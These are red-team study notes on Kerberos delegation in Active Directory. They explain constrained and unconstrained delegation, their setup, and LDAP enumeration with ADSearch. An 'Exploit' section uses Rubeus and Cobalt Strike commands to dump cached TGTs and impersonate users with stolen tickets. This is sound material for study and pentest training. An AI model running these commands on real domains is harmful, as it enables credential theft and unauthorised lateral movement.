# Delegation

Delegation refers to the ability of a service to impersonate a user and access resources on their behalf.\


_For example:_

User will perform Kerberos authentication to a Web Server. When the web server needs to access to the database on behalf of user, delegation was used.

<figure><img src="http://192.168.1.119/uploads/images/gallery/2024-01/scaled-1680-/f1fGQL58OxwyXnLi-image.png" alt=""><figcaption></figcaption></figure>

There are 2 types of delegation:

* Constrained Delegation
* Unconstrained Delegation

| Constrained Delegation                                                                                                       | Unconstrained Delegation                                                                                                      |
| ---------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------- |
| Restricts the delegation of credentials to specific services on specific computers.                                          | Allows a service to delegate the user's credentials to any other service on any computer in the domain.                       |
| Suitable for scenarios where you want to limit the scope of delegation to specific services and servers, enhancing security. | Suitable for scenarios where a service needs to access resources on multiple servers across the network without restrictions. |
| Considered more secure                                                                                                       | Higher security risk                                                                                                          |

## **How it works**

When a user perform Kerberos authentication to the server with delegation enabled, the server will extracts the user's TGT from the TGS and caches it in memory. When the server need to access to other service on behalf of the user, it will use the user’s TGT to request for a TGS.

<figure><img src="http://192.168.1.119/uploads/images/gallery/2024-01/scaled-1680-/DL2VWTk2OYPSfgHa-image.png" alt=""><figcaption></figcaption></figure>

***

## Unconstrained Delegation

### **Setting Up**

To enable unconstrained delegation for a server, go to "Active Directory Users and Computers" and go to the Properties windows for the server.

<figure><img src="http://192.168.1.119/uploads/images/gallery/2024-01/scaled-1680-/GJCd8LSe41Ri65AE-image.png" alt=""><figcaption></figcaption></figure>

In the Delegation tab, select "Trust this computer for delegation to any service (Kerberos only)".

<figure><img src="http://192.168.1.119/uploads/images/gallery/2024-01/scaled-1680-/GNCzZJV4nWgXVGVH-image.png" alt=""><figcaption></figcaption></figure>

### **Enumeration**

We will be using [ADSearch](https://github.com/tomcarver16/ADSearch) for enumeration.

```shell
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname
```

<figure><img src="http://192.168.1.119/uploads/images/gallery/2024-01/scaled-1680-/MT53KNs84CZXigEX-image.png" alt=""><figcaption></figcaption></figure>

Unconstrained delegation are always enabled on DC.

With a **SYSTEM/NT Authority** shell, use Rubeus to find all cached TGT on the machine with delegation turned on (in this case SQL.santaa.com).

```shell
Rubeus.exe triage
# OR run rubeus at an interval
Rubeus.exe monitor /interval:10 /nowrap
```

<figure><img src="http://192.168.1.119/uploads/images/gallery/2024-01/scaled-1680-/QITniUhd7KKhxWqi-image.png" alt=""><figcaption></figcaption></figure>

### **Exploit**

```shell
Rubeus.exe dump /luid:0x14794e /nowrap
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFwj[...]MuSU8=
steal_token 1540	# Cobalt Strike
```

***

## Constrained Delegation

### **Setting Up**

To enable constrained delegation for a server, go to "Active Directory Users and Computers" and go to the Properties windows for the server. In the Delegation tab, select "Trust this computer for delegation to specified services only" and add a service for delegation.

![image.png](http://192.168.1.119/uploads/images/gallery/2024-01/scaled-1680-/oTXY9U3BUq19xff7-image.png)

### **Enumeration**

```shell
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json
```

<figure><img src="http://192.168.1.119/uploads/images/gallery/2024-01/scaled-1680-/Z9nOHCAkZPAItfD2-image.png" alt=""><figcaption></figcaption></figure>

&#x20;
